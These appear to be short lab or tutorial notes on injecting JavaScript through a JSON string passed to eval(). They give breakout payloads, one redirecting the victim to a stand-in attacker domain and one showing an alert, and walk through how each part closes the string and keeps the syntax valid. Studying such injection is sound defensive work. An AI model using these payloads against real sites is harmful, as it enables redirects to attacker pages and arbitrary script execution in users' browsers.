Console logging:

web page manipulation:

Redirecting the user
'}); window.location.href = 'https://attacker-domain.com'; ({'dummy':'

alert example:
'}); alert('bad'); ({'dummy':'

How does it work?
To break out of these single quotes and inject arbitrary JavaScript code, you need to close the single quote,
inject your code, and then provide a way to validly terminate the JSON structure.

'}); alert('bad'); ({'dummy':'

'}); : This closes the current single quote and the curly brace, and then ends the current JSON structure.
alert('bad'); : This is the arbitrary JavaScript to inject and execute.
({ 'dummy':' : This starts a new object to keep the overall structure valid after the injected code.

When the input is provided, the constructed string becomes:
{"animal": ''}); alert('bad'); ({'dummy':''}

The eval() function will interpret and execute the alert('bad'); portion, showing the alert.
